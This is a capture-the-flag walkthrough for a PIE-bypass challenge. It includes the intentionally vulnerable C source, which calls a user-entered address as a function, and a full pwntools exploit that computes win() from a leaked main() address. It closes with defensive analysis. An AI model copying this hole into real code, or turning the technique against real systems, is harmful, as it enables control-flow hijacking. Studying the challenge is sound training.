# PIE Time CTF Walkthrough

## Executive Summary

This challenge demonstrates a PIE (Position Independent Executable) bypass vulnerability. The binary leaks the address of `main()`, allowing calculation of the `win()` function address. The program accepts a user-provided address and executes code at that location, enabling direct code execution when given the correct `win()` address.

---

## Phase 1: Reconnaissance

### 1.1 File Information

**Target Binary:** `vuln`

**Source Code Available:** Yes (`vuln.c`)

**File Type Analysis:**
```
ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked
PIE enabled
Not stripped
```

### 1.2 Security Protections Analysis

Using `checksec`:

| Protection | Status | Impact |
|-----------|--------|--------|
| **RELRO** | Full RELRO | GOT table read-only |
| **Stack Canary** | ✅ Found | Stack overflow protection |
| **NX** | ✅ Enabled | No shellcode on stack |
| **PIE** | ✅ Enabled | **CRITICAL: All addresses randomized** |
| **SHSTK** | ✅ Enabled | Shadow stack (Intel CET) |
| **IBT** | ✅ Enabled | Indirect branch tracking (Intel CET) |
| **Stripped** | ❌ No | Symbols available |

**Key Finding:** ALL modern protections enabled, including cutting-edge Intel CET features!

### 1.3 Program Behavior

```c
int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0);

  printf("Address of main: %p\n", &main);  // LEAK!

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);  // Read hex address
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;  // Cast to function pointer
  foo();  // EXECUTE USER-PROVIDED ADDRESS!
}
```

**Critical Observations:**
1. **Information Leak:** Prints address of `main()` function
2. **Arbitrary Code Execution:** Calls user-provided address as function pointer
3. **Win Function Exists:** `win()` reads and prints `flag.txt`

---

## Phase 2: Source Code Analysis

### 2.1 The win() Function

```c
int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL) {
      printf("Cannot open file.\n");
      exit(0);
  }

  c = fgetc(fptr);
  while (c != EOF) {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}
```

**Purpose:** Reads and displays the flag from `flag.txt`. This is our target!

### 2.2 The Vulnerability

**Line:** `void (*foo)(void) = (void (*)())val;`

This creates a function pointer from user input and immediately calls it. If we provide the address of `win()`, we get the flag!

**Why This Works:**
- No validation of the input address
- No CFI (Control Flow Integrity) checks beyond IBT/SHSTK
- Direct execution of user-controlled address

### 2.3 PIE Challenge

With PIE enabled, addresses are randomized on each execution:

**Example Runs:**
```
Run 1: main @ 0x55c5238db33d
Run 2: main @ 0x560a4f9ab33d
Run 3: main @ 0x55dfe324d33d
```

But the **relative offset** between functions is constant!

---

## Phase 3: Exploitation Strategy

### 3.1 PIE Bypass Technique

**Key Insight:** While absolute addresses change, relative offsets between functions remain constant within the binary.

**Formula:**
```
win_address = main_address - offset
```

Where `offset = address_of_main - address_of_win` (from binary analysis)

### 3.2 Finding the Offset

**Using objdump:**
```bash
objdump -d vuln | grep "<main>:"
# Output: 000000000000133d <main>:

objdump -d vuln | grep "<win>:"
# Output: 00000000000012a7 <win>:
```

**Calculate Offset:**
```
main_offset = 0x133d
win_offset = 0x12a7
offset = 0x133d - 0x12a7 = 0x96
```

### 3.3 Exploitation Steps

1. **Receive Leak:** Read the leaked `main()` address
2. **Calculate win():** Subtract offset (0x96)
3. **Send Address:** Provide calculated `win()` address
4. **Execute:** Program calls `win()` and prints flag

---

## Phase 4: Detailed Exploitation

### 4.1 Leak Extraction

**Program Output:**
```
Address of main: 0x55c5238db33d
```

**Parsing:**
```python
p.recvuntil(b'main: ')
main_leak = int(p.recvline().strip(), 16)  # 0x55c5238db33d
```

### 4.2 Address Calculation

```python
offset = 0x96  # Pre-calculated from binary analysis
win_addr = main_leak - offset
# Example: 0x55c5238db33d - 0x96 = 0x55c5238db2a7
```

### 4.3 Payload Delivery

```python
p.sendlineafter(b"0x12345: ", hex(win_addr).encode())
# Sends: 0x55c5238db2a7
```

### 4.4 Execution Flow

```
1. Program leaks: 0x55c5238db33d (main)
2. We calculate:  0x55c5238db2a7 (win)
3. We send:       0x55c5238db2a7
4. Program casts to function pointer
5. Program executes: win()
6. win() opens flag.txt
7. Flag printed!
```

---

## Phase 5: Why Protections Don't Help

| Protection | Bypass Technique | Explanation |
|-----------|------------------|-------------|
| **PIE** | Address leak | Main address leaked, offset calculated |
| **Canary** | Not triggered | No buffer overflow, just code execution |
| **NX** | Not relevant | Using existing code, not injecting shellcode |
| **Full RELRO** | Not targeted | Not modifying GOT |
| **SHSTK/IBT** | Valid target | win() is a valid function in the binary |

**Critical Insight:** The vulnerability is in the **logic**, not memory corruption. The program voluntarily executes user-provided addresses!

---

## Phase 6: Key Learnings

| Concept | Explanation |
|---------|------------|
| **PIE Bypass** | Leak one address, calculate others using offsets |
| **Function Pointers** | Can be dangerous when user-controlled |
| **Information Disclosure** | Even leaking one address can compromise PIE |
| **Relative Offsets** | Constant within binary, independent of base address |
| **Code Reuse** | Calling existing functions (not ROP, just direct call) |

---

## Phase 7: Defense Analysis

**Why This Code Is Vulnerable:**

1. **Information Leak:** Leaking any code address defeats PIE
2. **Arbitrary Execution:** Executing user-provided addresses is inherently dangerous
3. **No Validation:** No checks on input address (e.g., is it in code section?)
4. **Intentional Vulnerability:** This is a CTF challenge, intentionally vulnerable

**Secure Alternative:**
```c
// DON'T DO THIS:
void (*foo)(void) = (void (*)())user_input;
foo();

// DO THIS INSTEAD:
if (user_choice == 1) {
    function_a();
} else if (user_choice == 2) {
    function_b();
}
```

---

## Phase 8: Intel CET Features

**SHSTK (Shadow Stack):**
- Hardware-enforced shadow stack for return addresses
- Prevents return address overwrites
- Not relevant here (we're not overwriting returns)

**IBT (Indirect Branch Tracking):**
- Ensures indirect jumps go to valid function entry points
- `win()` IS a valid function, so IBT allows it
- Would block jumps to middle of functions or data sections

**Why CET Doesn't Block This:**
- We're calling a legitimate function address
- win() starts with valid ENDBR64 instruction
- This is a "valid" indirect call from IBT perspective

---

## Phase 9: Comparison with Previous Challenges

| Challenge | Technique | Protection Bypass |
|-----------|-----------|-------------------|
| PWN101-103 | Buffer Overflow | No protections |
| PWN104 | Shellcode | Disabled NX |
| PWN105 | Integer Overflow | Logic bug |
| PWN106 | Format String Leak | Information disclosure |
| PWN107 | Format String + ROP | Canary + PIE leak |
| **PIE Time** | **Direct Code Execution** | **PIE leak** |

**Unique Aspect:** No memory corruption needed. The program executes user input voluntarily!

---

## Phase 10: Exploitation Walkthrough

### Step 1: Analyze Binary
```bash
objdump -d vuln | grep "<main>:"   # Find main offset
objdump -d vuln | grep "<win>:"    # Find win offset
# Calculate: offset = main - win = 0x96
```

### Step 2: Run Exploit
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

# Receive leak
p.recvuntil(b'main: ')
main_leak = int(p.recvline().strip(), 16)
log.success(f"Main address at: {hex(main_leak)}")

# Calculate win
win_addr = main_leak - 0x96
log.success(f"Win address at: {hex(win_addr)}")

# Send and win
p.sendlineafter(b"0x12345: ", hex(win_addr).encode())
p.interactive()
```

### Step 3: Get Flag
```
$ python3 exploit.py
Main address at: 0x55c5238db33d
Win address at: 0x55c5238db2a7
You won!
picoCTF{<flag_content>}
```

---

## Commands Reference

```bash
# Analysis
checksec --file=vuln
objdump -d vuln | grep "<main>:"
objdump -d vuln | grep "<win>:"
cat vuln.c

# Execution
python3 exploit.py

# Manual testing
./vuln
# Note the main address
# Calculate: win = main - 0x96
# Enter the win address
```

---

## Conclusion

This challenge teaches a fundamental principle: **information disclosure defeats ASLR/PIE**. Even with all modern protections, leaking a single code address allows calculating any other code address. The key lesson is that PIE is only effective when:

1. No addresses are leaked
2. No code allows arbitrary execution
3. Proper input validation exists

The "pie time" challenge demonstrates that even cutting-edge protections (Intel CET) cannot prevent exploitation when the program logic itself is flawed. **Secure coding practices are as important as compiler protections.**
